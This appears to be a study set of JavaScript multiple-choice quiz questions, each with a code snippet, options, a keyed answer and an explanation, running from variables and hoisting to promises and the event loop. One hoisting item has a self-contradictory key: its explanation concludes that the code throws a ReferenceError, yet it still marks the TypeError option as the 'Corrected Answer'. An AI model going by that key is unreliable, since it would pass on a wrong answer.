# JavaScript Scenario-Based MCQ

> Scenario-based multiple choice questions covering JavaScript topics.

<br>

## Related Topics

* *[HTML Basics](https://github.com/learning-zone/html-basics)*
* *[CSS Basics](https://github.com/learning-zone/css-basics)*
* *[JavaScript ES6 Basics](https://github.com/learning-zone/javascript-es6-basics)*
* *[JavaScript Unit Testing](https://github.com/learning-zone/javascript-unit-testing)*
* *[JavaScript Coding Practice](https://github.com/learning-zone/javascript-coding-practice)*
* *[JavaScript Design Patterns](https://github.com/learning-zone/javascript-design-patterns)*
* *[Data Structure in JavaScript](https://github.com/learning-zone/javascript-data-structure)*

<br>

## Table of Contents

## L1: Fundamental (Entry-Level / Junior)
Focus: Syntax, basic logic, and standard data handling.

* [Variables](#-1-variables): var, let, const.
* [Data Types](#-2-data-types): Primitives vs. Objects.
* [Operators](#-3-operators): Arithmetic, comparison (== vs ===), and logical.
* [Numbers](#-4-numbers) & [String](#-6-string): Basic methods like .toFixed() or .slice().
* [Arrays](#-5-array): Basic manipulation using push(), pop(), and length.
* [Control Flow](#-6-control-flow): Simple if/else and for loops.
* [Functions](#-7-functions): Standard declarations and parameters.  

## L2: Intermediate (Junior-Mid / Developer)
Focus: ES6+ features, DOM, and common "trick" concepts.

* [Scope & Closures](#-8-scope--closures): Understanding block scope and lexical scoping.
* [Hoisting](#-9-hoisting): Variable and function declarations.
* [ES6 Features](#-10-es6-features): Arrow functions, template literals, and destructuring.
* [DOM & Events](#-11-events): Selecting elements, adding listeners, and event bubbling.
* [Regular Expressions](#-12-regular-expression): Basic pattern matching.
* [Error Handling](#-13-error-handling): Using try...catch.
* [Web Storage](#-14-web-storage): localStorage and sessionStorage.  

## L3: Advanced (Mid-Senior / Lead)
Focus: Asynchronous operations, performance, and internal engine mechanics. [4] 

* [Promises](#-15-promises) & [Async/Await](#-16-Async--Await): Handling complex asynchronous flows.
* [Event Loop](#-16-Event-Loop): Understanding the microtask vs. macrotask queue.
* [this Keyword](#-17-this-keyword): Binding with .call(), .apply(), and .bind().
* [Objects & Prototypes](#-18-objects--prototypes): Prototypal inheritance and the prototype chain.
* [Functional Programming](#-19-functional-programming): High-order functions like map, filter, and reduce.
* [Classes](#-20-classes): Inheritance, constructors, and static methods.
* [Modules](#-21-modules): ES Modules (import/export).  

## L4: Expert (Senior / Architect)
Focus: Scalability, security, and low-level optimization.

* [Performance Optimization](#-22-performance-optimization): Memoization, debouncing/throttling, and avoiding memory leaks.
* [Design Patterns](#-23-design-patterns): Singleton, Factory, and Pub-Sub patterns.
* [Security](#-24-security): Preventing XSS, CSRF, and secure data handling.
* [Browser Internals](#-25-browser-performance): Rendering behavior, reflows, and repaints.
* [Progressive Web Apps (PWA)](#-26-progressive-web-apps-pwa): Service workers and caching strategies.
* [Complex Problem Solving](#-27-real-world-problem-solving): Coding simulators for real-world algorithmic tasks. 

<br>

## L1: Fundamental (Entry-Level / Junior)

<br>

## # 1. Variables

<br>

## Q. A developer writes the following code inside a function. What is the output?

```javascript
function test() {
  console.log(x);
  var x = 5;
  console.log(x);
}
test();
```

- A) `ReferenceError: x is not defined`, `5`
- B) `undefined`, `5`
- C) `5`, `5`
- D) `null`, `5`

**Answer: B) `undefined`, `5`**

**Explanation:** `var` declarations are hoisted to the top of their function scope and initialized to `undefined`. So `console.log(x)` before assignment prints `undefined`, and after assignment it prints `5`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A team decides to use `let` instead of `var` for all loop counters. What happens when this code runs?

```javascript
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
```

- A) `3`, `3`, `3`
- B) `0`, `1`, `2`
- C) `undefined`, `undefined`, `undefined`
- D) `ReferenceError`

**Answer: B) `0`, `1`, `2`**

**Explanation:** `let` creates a new binding for each iteration of the loop due to block scoping. Each `setTimeout` callback captures its own `i` value. With `var`, the output would be `3, 3, 3`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer writes a configuration object that should never be reassigned. Which declaration is most appropriate and what happens if you try to modify it?

```javascript
const config = { apiUrl: "https://api.example.com" };
config.apiUrl = "https://new-api.com";
console.log(config.apiUrl);
```

- A) Throws a `TypeError` — `const` prevents all mutations
- B) Logs `"https://new-api.com"` — `const` only prevents reassignment, not mutation
- C) Logs `"https://api.example.com"` — `const` silently ignores the assignment
- D) Throws a `SyntaxError` at declaration

**Answer: B) Logs `"https://new-api.com"` — `const` only prevents reassignment, not mutation**

**Explanation:** `const` prevents rebinding (e.g., `config = {}` would throw), but the object\'s properties can still be changed. To truly freeze an object, use `Object.freeze(config)`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is logged to the console?

```javascript
let a = 1;
let b = a;
b = 2;
console.log(a);
```

- A) `2`
- B) `1`
- C) `undefined`
- D) `null`

**Answer: B) `1`**

**Explanation:** Primitive values like numbers are copied by value. Assigning `b = a` creates an independent copy, so modifying `b` has no effect on `a`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 2. Data Types

<br>

## Q. A developer checks data types using `typeof`. What does the following code output?

```javascript
console.log(typeof null);
console.log(typeof undefined);
console.log(typeof NaN);
console.log(typeof function(){});
```

- A) `"null"`, `"undefined"`, `"NaN"`, `"function"`
- B) `"object"`, `"undefined"`, `"number"`, `"function"`
- C) `"null"`, `"undefined"`, `"number"`, `"object"`
- D) `"object"`, `"null"`, `"number"`, `"function"`

**Answer: B) `"object"`, `"undefined"`, `"number"`, `"function"`**

**Explanation:** `typeof null === "object"` is a well-known JavaScript bug. `NaN` is of type `"number"`. `undefined` correctly returns `"undefined"`, and functions return `"function"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. Two variables hold values. What does the equality check return?

```javascript
let arr1 = [1, 2, 3];
let arr2 = [1, 2, 3];
console.log(arr1 === arr2);
```

- A) `true` — the arrays contain the same values
- B) `false` — arrays are compared by reference, not value
- C) `undefined`
- D) Throws a `TypeError`

**Answer: B) `false` — arrays are compared by reference, not value**

**Explanation:** Arrays and objects are reference types. `arr1` and `arr2` are two separate objects in memory. Even though their contents are equal, `===` compares memory references, not values.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output?

```javascript
console.log(0 == false);
console.log(0 === false);
console.log("" == false);
console.log("" === false);
```

- A) `true`, `true`, `true`, `true`
- B) `true`, `false`, `true`, `false`
- C) `false`, `false`, `true`, `true`
- D) `true`, `true`, `false`, `false`

**Answer: B) `true`, `false`, `true`, `false`**

**Explanation:** `==` performs type coercion: `0 == false` and `"" == false` coerce to the same numeric value (`0`). `===` checks both value and type with no coercion, so `0 === false` and `"" === false` are both `false`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 3. Operators

<br>

## Q. A developer uses the nullish coalescing operator. What is printed?

```javascript
let userInput = 0;
let result1 = userInput || "default";
let result2 = userInput ?? "default";
console.log(result1);
console.log(result2);
```

- A) `"default"`, `"default"`
- B) `0`, `0`
- C) `"default"`, `0`
- D) `0`, `"default"`

**Answer: C) `"default"`, `0`**

**Explanation:** `||` returns the right side for any falsy value (including `0`, `""`, `false`). `??` (nullish coalescing) only returns the right side when the left is `null` or `undefined`. Since `0` is not `null`/`undefined`, `??` returns `0`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the result of the following expressions?

```javascript
console.log(5 + "3");
console.log(5 - "3");
console.log(true + true);
console.log(true + false);
```

- A) `"53"`, `2`, `2`, `1`
- B) `8`, `2`, `2`, `1`
- C) `"53"`, `"53"`, `2`, `1`
- D) `8`, `"53"`, `2`, `0`

**Answer: A) `"53"`, `2`, `2`, `1`**

**Explanation:** `+` with a string triggers concatenation: `5 + "3" = "53"`. `-` does not concatenate — it coerces `"3"` to a number: `5 - 3 = 2`. Booleans coerce to `0` or `1` in arithmetic: `true + true = 2`, `true + false = 1`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the short-circuit evaluation return?

```javascript
let a = null;
let b = a && a.name;
let c = a || "Anonymous";
console.log(b);
console.log(c);
```

- A) `TypeError`, `"Anonymous"`
- B) `null`, `"Anonymous"`
- C) `undefined`, `null`
- D) `null`, `null`

**Answer: B) `null`, `"Anonymous"`**

**Explanation:** `&&` short-circuits at the first falsy value (`null`), so `b = null` without evaluating `a.name`. `||` short-circuits at the first truthy value; since `a` is `null` (falsy), it evaluates to `"Anonymous"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 4. Numbers

<br>

## Q. A developer needs to format a price to two decimal places. What is the output?

```javascript
let price = 19.5;
console.log(price.toFixed(2));
console.log(typeof price.toFixed(2));
```

- A) `19.50`, `"number"`
- B) `"19.50"`, `"string"`
- C) `19.5`, `"number"`
- D) `"19.5"`, `"string"`

**Answer: B) `"19.50"`, `"string"`**

**Explanation:** `.toFixed()` returns a **string**, not a number. This is a common source of bugs when developers expect a number back and then attempt arithmetic.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of this floating-point operation?

```javascript
console.log(0.1 + 0.2 === 0.3);
console.log(0.1 + 0.2);
```

- A) `true`, `0.3`
- B) `false`, `0.30000000000000004`
- C) `false`, `0.3`
- D) `true`, `0.30000000000000004`

**Answer: B) `false`, `0.30000000000000004`**

**Explanation:** JavaScript uses IEEE 754 floating-point arithmetic, which cannot represent some decimal fractions exactly. The result `0.1 + 0.2` is `0.30000000000000004`. Use `Number.EPSILON` for safe comparison: `Math.abs(0.1 + 0.2 - 0.3) < Number.EPSILON`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 5. String

<br>

## Q. A developer needs to extract a file extension. Which snippet correctly gets `"pdf"` from `"report.pdf"`?

```javascript
let filename = "report.pdf";
```

- A) `filename.slice(-3)`
- B) `filename.substring(filename.lastIndexOf(".") + 1)`
- C) `filename.split(".")[1]`
- D) All of the above

**Answer: D) All of the above**

**Explanation:** All three work for `"report.pdf"`: `.slice(-3)` gets the last 3 characters; `.lastIndexOf(".") + 1` finds the extension after the last dot; `.split(".")[1]` splits on dot and gets the second part. However, `.lastIndexOf` is most robust for filenames with multiple dots.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the following string operation produce?

```javascript
let str = "Hello, World!";
console.log(str.indexOf("World"));
console.log(str.includes("world"));
console.log(str.toLowerCase().includes("world"));
```

- A) `7`, `true`, `true`
- B) `7`, `false`, `true`
- C) `-1`, `false`, `true`
- D) `7`, `false`, `false`

**Answer: B) `7`, `false`, `true`**

**Explanation:** `.indexOf("World")` returns `7` (the index where `"World"` starts). `.includes()` is case-sensitive, so `"world"` is not found. After `.toLowerCase()`, `"world"` is found.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 6. Array

<br>

## Q. A developer manages a task queue. What is the output after these operations?

```javascript
let queue = ["task1", "task2", "task3"];
queue.push("task4");
let first = queue.shift();
console.log(first);
console.log(queue.length);
```

- A) `"task1"`, `3`
- B) `"task4"`, `3`
- C) `"task1"`, `4`
- D) `"task4"`, `4`

**Answer: A) `"task1"`, `3`**

**Explanation:** `.push()` adds `"task4"` to the end (array is now length 4). `.shift()` removes and returns the **first** element (`"task1"`), leaving 3 elements.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output?

```javascript
let nums = [1, 2, 3, 4, 5];
let sliced = nums.slice(1, 3);
let spliced = nums.splice(1, 2);
console.log(sliced);
console.log(spliced);
console.log(nums);
```

- A) `[2, 3]`, `[2, 3]`, `[1, 4, 5]`
- B) `[2, 3]`, `[2, 3]`, `[1, 2, 3, 4, 5]`
- C) `[1, 2, 3]`, `[2, 3]`, `[1, 4, 5]`
- D) `[2, 3]`, `[1, 2]`, `[3, 4, 5]`

**Answer: A) `[2, 3]`, `[2, 3]`, `[1, 4, 5]`**

**Explanation:** `.slice(1, 3)` returns elements at indices 1 and 2 (`[2, 3]`) **without** modifying the original. `.splice(1, 2)` removes 2 elements starting at index 1 (`[2, 3]`) and **modifies** the original array, leaving `[1, 4, 5]`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 7. Control Flow

<br>

## Q. What is the output of this loop?

```javascript
for (var i = 0; i < 3; i++) {
  if (i === 1) continue;
  console.log(i);
}
```

- A) `0`, `1`, `2`
- B) `0`, `2`
- C) `1`
- D) `0`

**Answer: B) `0`, `2`**

**Explanation:** `continue` skips the current iteration when `i === 1`, so `1` is never logged. The loop runs for `i = 0`, skips `i = 1`, runs for `i = 2`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer writes a switch statement. What is logged?

```javascript
let day = 2;
switch (day) {
  case 1:
    console.log("Monday");
  case 2:
    console.log("Tuesday");
  case 3:
    console.log("Wednesday");
    break;
  default:
    console.log("Unknown");
}
```

- A) `"Tuesday"`
- B) `"Tuesday"`, `"Wednesday"`
- C) `"Tuesday"`, `"Wednesday"`, `"Unknown"`
- D) `"Monday"`, `"Tuesday"`, `"Wednesday"`

**Answer: B) `"Tuesday"`, `"Wednesday"`**

**Explanation:** Without a `break` after `case 2`, execution "falls through" to `case 3`. The `break` in `case 3` stops further execution. This is a common JavaScript gotcha.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 8. Functions

<br>

## Q. A function is called before it is defined. What is the output?

```javascript
console.log(greet("Alice"));

function greet(name) {
  return "Hello, " + name;
}
```

- A) `ReferenceError: greet is not defined`
- B) `TypeError: greet is not a function`
- C) `"Hello, Alice"`
- D) `undefined`

**Answer: C) `"Hello, Alice"`**

**Explanation:** Function declarations are fully hoisted — both the name and body. You can call them before they appear in code. This is different from function expressions (`const greet = function(){}`) which are not hoisted.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of this function with default parameters?

```javascript
function createUser(name, role = "viewer", active = true) {
  return `${name} | ${role} | ${active}`;
}
console.log(createUser("Alice"));
console.log(createUser("Bob", undefined, false));
```

- A) `"Alice | viewer | true"`, `"Bob | viewer | false"`
- B) `"Alice | undefined | undefined"`, `"Bob | undefined | false"`
- C) `"Alice | viewer | true"`, `"Bob | undefined | false"`
- D) Error on both calls

**Answer: A) `"Alice | viewer | true"`, `"Bob | viewer | false"`**

**Explanation:** When a parameter is `undefined` (or omitted), the default value is used. Passing `undefined` explicitly still triggers the default. Passing `false` explicitly overrides the default.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## L2: Intermediate (Junior-Mid / Developer)

<br>

## # 8. Scope & Closures

<br>

## Q. A developer creates counter functions using closures. What does the following output?

```javascript
function makeCounter() {
  let count = 0;
  return {
    increment: () => ++count,
    decrement: () => --count,
    value: () => count
  };
}

const counter = makeCounter();
counter.increment();
counter.increment();
counter.decrement();
console.log(counter.value());
```

- A) `0`
- B) `1`
- C) `2`
- D) `3`

**Answer: B) `1`**

**Explanation:** The closure retains access to `count`. Starting at `0`: `increment()` → `1`, `increment()` → `2`, `decrement()` → `1`. `counter.value()` returns `1`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of this immediately invoked function?

```javascript
const result = (function() {
  let x = 10;
  return function(y) {
    return x + y;
  };
})();

console.log(result(5));
console.log(typeof x);
```

- A) `15`, `"number"`
- B) `15`, `"undefined"`
- C) `NaN`, `"undefined"`
- D) `ReferenceError`

**Answer: B) `15`, `"undefined"`**

**Explanation:** The IIFE runs immediately, and `result` holds the inner function. `x` is enclosed in the IIFE\'s scope — it\'s inaccessible outside, so `typeof x` returns `"undefined"` (not a ReferenceError because `typeof` on an undeclared variable is safe).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 9. Hoisting

<br>

## Q. What is the output of the following code?

```javascript
console.log(foo());
console.log(bar());

function foo() { return "foo"; }
const bar = function() { return "bar"; };
```

- A) `"foo"`, `"bar"`
- B) `"foo"`, `TypeError: bar is not a function`
- C) `ReferenceError`, `"bar"`
- D) `undefined`, `undefined`

**Answer: B) `"foo"`, `TypeError: bar is not a function`**

**Explanation:** Function declarations are fully hoisted, so `foo()` works. `bar` is a `const` variable in the Temporal Dead Zone (TDZ) at the time of the call, but since we call `bar()` after its declaration line... Wait, actually `const bar` is declared but its value (function expression) isn\'t assigned yet at hoisting time. At the point `console.log(bar())` is called, `bar` is in TDZ and will throw a `ReferenceError`. However, if `var bar` were used, it would be `TypeError`. With `const`, it\'s actually `ReferenceError: Cannot access 'bar' before initialization`.

**Corrected Answer: B) — Note:** With `const`, accessing `bar` before its declaration throws `ReferenceError: Cannot access 'bar' before initialization` due to the Temporal Dead Zone. With `var`, it would be `TypeError: bar is not a function`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the following output?

```javascript
var x = "global";

function outer() {
  console.log(x);
  var x = "local";
  console.log(x);
}

outer();
console.log(x);
```

- A) `"global"`, `"local"`, `"global"`
- B) `"global"`, `"local"`, `"local"`
- C) `undefined`, `"local"`, `"global"`
- D) `ReferenceError`, `"local"`, `"global"`

**Answer: C) `undefined`, `"local"`, `"global"`**

**Explanation:** Inside `outer()`, the local `var x` is hoisted to the top of the function, shadowing the global. At the first `console.log(x)`, `x` is hoisted but not yet assigned → `undefined`. After assignment, it\'s `"local"`. The global `x` remains `"global"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 10. ES6 Features

<br>

## Q. A developer uses destructuring. What is the output?

```javascript
const [a, , b, c = 99] = [10, 20, 30];
console.log(a, b, c);
```

- A) `10`, `20`, `30`
- B) `10`, `30`, `99`
- C) `10`, `30`, `undefined`
- D) `10`, `20`, `99`

**Answer: B) `10`, `30`, `99`**

**Explanation:** The second element (`20`) is skipped using an empty slot. `b` captures `30`. `c` has a default of `99` and since there is no fourth element, it uses the default.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does this template literal and tagged template return?

```javascript
const name = "World";
const greeting = `Hello, ${name.toUpperCase()}! ${2 + 2} items.`;
console.log(greeting);
```

- A) `"Hello, ${name.toUpperCase()}! ${2 + 2} items."`
- B) `"Hello, World! 4 items."`
- C) `"Hello, WORLD! 4 items."`
- D) `SyntaxError`

**Answer: C) `"Hello, WORLD! 4 items."`**

**Explanation:** Template literals evaluate expressions inside `${}`. `name.toUpperCase()` produces `"WORLD"` and `2 + 2` evaluates to `4`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer converts a function to an arrow function. What is the key behavioral difference?

```javascript
const obj = {
  value: 42,
  regular: function() { return this.value; },
  arrow: () => this.value
};

console.log(obj.regular());
console.log(obj.arrow());
```

- A) `42`, `42`
- B) `42`, `undefined`
- C) `undefined`, `42`
- D) Both throw `TypeError`

**Answer: B) `42`, `undefined`**

**Explanation:** Regular functions get their own `this` based on how they are called. When `obj.regular()` is called, `this` is `obj`, so it returns `42`. Arrow functions inherit `this` from the surrounding lexical scope. Since this object literal is in the global scope, `this.value` is `undefined` (or throws in strict mode).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output of this spread/rest example?

```javascript
function sum(...nums) {
  return nums.reduce((acc, n) => acc + n, 0);
}

const values = [1, 2, 3];
console.log(sum(...values, 4, 5));
```

- A) `[1, 2, 3, 4, 5]`
- B) `15`
- C) `10`
- D) `TypeError`

**Answer: B) `15`**

**Explanation:** The spread operator `...values` expands the array into individual arguments. Combined with `4` and `5`, `sum` receives `1, 2, 3, 4, 5`. The rest parameter `...nums` collects all arguments into an array. `reduce` sums them to `15`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 11. DOM & Events

<br>

## Q. A developer attaches event listeners with `addEventListener`. What is logged when the button is clicked?

```javascript
const btn = document.querySelector("#btn");

btn.addEventListener("click", function() {
  console.log("listener 1");
});

btn.addEventListener("click", function() {
  console.log("listener 2");
});
```

- A) Only `"listener 2"` — second listener overwrites the first
- B) `"listener 1"` then `"listener 2"` — both fire
- C) `"listener 1"` only — first listener takes priority
- D) Neither fires — duplicate event type causes an error

**Answer: B) `"listener 1"` then `"listener 2"` — both fire**

**Explanation:** Unlike `onclick = fn`, which allows only one handler, `addEventListener` registers multiple listeners for the same event type. Both execute in the order they were registered.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer has nested elements with click handlers. What is the console output when the inner `<div>` is clicked?

```javascript
document.getElementById("outer").addEventListener("click", () => console.log("outer"));
document.getElementById("inner").addEventListener("click", () => console.log("inner"));
```

HTML: `<div id="outer"><div id="inner">Click me</div></div>`

- A) `"outer"` only
- B) `"inner"` only
- C) `"inner"` then `"outer"` — event bubbles up
- D) `"outer"` then `"inner"` — event captures down

**Answer: C) `"inner"` then `"outer"` — event bubbles up**

**Explanation:** By default, `addEventListener` uses the **bubbling phase**. The event fires on the target (`"inner"`) first, then bubbles up to ancestors. To use capturing (top-down), pass `{ capture: true }` as the third argument.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 12. Regular Expressions

<br>

## Q. A developer validates an email-like pattern. What does the following return?

```javascript
const pattern = /^[a-zA-Z0-9]+@[a-zA-Z]+\.[a-zA-Z]{2,}$/;
console.log(pattern.test("user@example.com"));
console.log(pattern.test("user @example.com"));
console.log(pattern.test("user@.com"));
```

- A) `true`, `true`, `true`
- B) `true`, `false`, `false`
- C) `true`, `true`, `false`
- D) `false`, `false`, `true`

**Answer: B) `true`, `false`, `false`**

**Explanation:** The first matches the pattern. The second has a space (not in `[a-zA-Z0-9]+`), so it fails. The third has no domain name before `.com` (`[a-zA-Z]+` requires at least one letter), so it fails.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `.replace()` with a regex return?

```javascript
const str = "foo bar foo baz foo";
console.log(str.replace(/foo/, "qux"));
console.log(str.replace(/foo/g, "qux"));
```

- A) `"qux bar foo baz foo"`, `"qux bar qux baz qux"`
- B) `"qux bar qux baz qux"`, `"qux bar qux baz qux"`
- C) `"qux bar foo baz foo"`, `"qux bar foo baz foo"`
- D) Both return `"qux bar foo baz foo"`

**Answer: A) `"qux bar foo baz foo"`, `"qux bar qux baz qux"`**

**Explanation:** Without the `g` (global) flag, `.replace()` only replaces the **first** occurrence. With `/g`, all occurrences are replaced.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 13. Error Handling

<br>

## Q. A developer calls an API and handles errors. What does the following log?

```javascript
function riskyOp() {
  throw new TypeError("Invalid input");
}

try {
  riskyOp();
  console.log("success");
} catch (e) {
  console.log(e instanceof TypeError, e.message);
} finally {
  console.log("cleanup");
}
```

- A) `"success"`, `"cleanup"`
- B) `true "Invalid input"`, `"cleanup"`
- C) `true "Invalid input"` only
- D) `false "Invalid input"`, `"cleanup"`

**Answer: B) `true "Invalid input"`, `"cleanup"`**

**Explanation:** `throw new TypeError(...)` is caught by `catch`. `e instanceof TypeError` is `true`, and `e.message` is `"Invalid input"`. The `finally` block **always** runs regardless of whether an exception was thrown.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is logged when this runs?

```javascript
function parseJSON(str) {
  try {
    return JSON.parse(str);
  } catch {
    return null;
  }
}

console.log(parseJSON('{"name":"Alice"}'));
console.log(parseJSON("not json"));
```

- A) `{name: "Alice"}`, `null`
- B) `{name: "Alice"}`, `SyntaxError`
- C) `null`, `null`
- D) `"Alice"`, `null`

**Answer: A) `{name: "Alice"}`, `null`**

**Explanation:** Valid JSON is parsed successfully. `"not json"` causes `JSON.parse` to throw a `SyntaxError`, which is caught and `null` is returned. The optional catch binding (`catch` without a parameter) is valid ES2019+.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 14. Web Storage

<br>

## Q. A developer stores user preferences. What is the key difference between `localStorage` and `sessionStorage`?

```javascript
localStorage.setItem("theme", "dark");
sessionStorage.setItem("token", "abc123");
```

- A) `localStorage` stores numbers; `sessionStorage` stores strings
- B) `localStorage` persists across browser sessions; `sessionStorage` is cleared when the tab/window closes
- C) `sessionStorage` can store more data than `localStorage`
- D) `localStorage` is synchronous; `sessionStorage` is asynchronous

**Answer: B) `localStorage` persists across browser sessions; `sessionStorage` is cleared when the tab/window closes**

**Explanation:** `localStorage` data persists until explicitly cleared. `sessionStorage` is scoped to the browser tab/window session and is lost when it closes. Both share the same API and store data as strings.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the following storage code output?

```javascript
localStorage.setItem("count", 5);
let count = localStorage.getItem("count");
console.log(count + 1);
console.log(typeof count);
```

- A) `6`, `"number"`
- B) `"51"`, `"string"`
- C) `6`, `"string"`
- D) `NaN`, `"string"`

**Answer: B) `"51"`, `"string"`**

**Explanation:** Web Storage always stores and retrieves values as **strings**. Even though `5` was stored as a number, `getItem()` returns `"5"`. String concatenation: `"5" + 1 = "51"`. Parse first: `parseInt(count) + 1`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## L3: Advanced (Mid-Senior / Lead)

<br>

## # 15. Promises

<br>

## Q. A developer chains promises. What is logged?

```javascript
Promise.resolve(1)
  .then(x => x + 1)
  .then(x => { throw new Error("oops"); })
  .then(x => console.log("then:", x))
  .catch(e => console.log("catch:", e.message))
  .then(() => console.log("after catch"));
```

- A) `"then: 2"`, `"after catch"`
- B) `"catch: oops"`, `"after catch"`
- C) `"catch: oops"` only
- D) Unhandled Promise Rejection

**Answer: B) `"catch: oops"`, `"after catch"`**

**Explanation:** The chain starts resolving. The second `.then` throws, which skips the next `.then` and jumps to `.catch`. The `.catch` handles the error and returns `undefined` (a resolved promise), so `.then` after `.catch` runs.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer runs multiple API calls. What does `Promise.allSettled` return compared to `Promise.all`?

```javascript
const p1 = Promise.resolve("ok");
const p2 = Promise.reject("fail");
const p3 = Promise.resolve("also ok");

Promise.all([p1, p2, p3])
  .then(console.log)
  .catch(e => console.log("all:", e));

Promise.allSettled([p1, p2, p3])
  .then(results => results.forEach(r => console.log(r.status)));
```

- A) `"all: fail"`, `"fulfilled"`, `"rejected"`, `"fulfilled"`
- B) `"all: fail"` and nothing from `allSettled`
- C) Both print all three results
- D) `"all: fail"`, `"fulfilled"`, `"fulfilled"`, `"fulfilled"`

**Answer: A) `"all: fail"`, `"fulfilled"`, `"rejected"`, `"fulfilled"`**

**Explanation:** `Promise.all` short-circuits on the first rejection. `Promise.allSettled` waits for all promises to settle (regardless of outcome) and returns an array of `{ status, value/reason }` objects — never rejects.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 16. Async / Await

<br>

## Q. What is the output of this async/await code?

```javascript
async function fetchData() {
  return 42;
}

async function main() {
  const result = await fetchData();
  console.log(result);
  console.log(result + 1);
}

console.log("start");
main();
console.log("end");
```

- A) `"start"`, `42`, `43`, `"end"`
- B) `"start"`, `"end"`, `42`, `43`
- C) `42`, `43`, `"start"`, `"end"`
- D) `"start"`, `42`, `"end"`, `43`

**Answer: B) `"start"`, `"end"`, `42`, `43`**

**Explanation:** `console.log("start")` runs synchronously. `main()` is called and starts executing, but `await` suspends `main` and control returns to the call site. `console.log("end")` runs synchronously. Then the microtask queue resolves the awaited promise, and `42` and `43` log.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer handles async errors. What does this print?

```javascript
async function getUser(id) {
  if (id < 0) throw new Error("Invalid ID");
  return { id, name: "Alice" };
}

async function run() {
  try {
    const user = await getUser(-1);
    console.log(user.name);
  } catch (e) {
    console.log("Error:", e.message);
  }
}

run();
```

- A) `"Alice"`
- B) `"Error: Invalid ID"`
- C) Unhandled Promise Rejection
- D) `undefined`

**Answer: B) `"Error: Invalid ID"`**

**Explanation:** `async` functions that `throw` return a rejected promise. `await` unwraps the rejection and throws it, which is caught by the `try...catch`. This is the idiomatic way to handle async errors.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 16. Event Loop

<br>

## Q. What is the exact order of the console output?

```javascript
console.log("1");

setTimeout(() => console.log("2"), 0);

Promise.resolve().then(() => console.log("3"));

console.log("4");
```

- A) `1`, `2`, `3`, `4`
- B) `1`, `4`, `2`, `3`
- C) `1`, `4`, `3`, `2`
- D) `1`, `3`, `4`, `2`

**Answer: C) `1`, `4`, `3`, `2`**

**Explanation:** Synchronous code runs first: `"1"`, `"4"`. Then the **microtask queue** (Promises) runs before the **macrotask queue** (setTimeout). So `"3"` (Promise) runs before `"2"` (setTimeout with 0ms delay).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer is debugging a performance issue. What is the output of this nested timer code?

```javascript
setTimeout(() => {
  console.log("timeout 1");
  Promise.resolve().then(() => console.log("microtask inside timeout"));
}, 0);

setTimeout(() => console.log("timeout 2"), 0);
```

- A) `"timeout 1"`, `"timeout 2"`, `"microtask inside timeout"`
- B) `"timeout 1"`, `"microtask inside timeout"`, `"timeout 2"`
- C) `"microtask inside timeout"`, `"timeout 1"`, `"timeout 2"`
- D) `"timeout 2"`, `"timeout 1"`, `"microtask inside timeout"`

**Answer: B) `"timeout 1"`, `"microtask inside timeout"`, `"timeout 2"`**

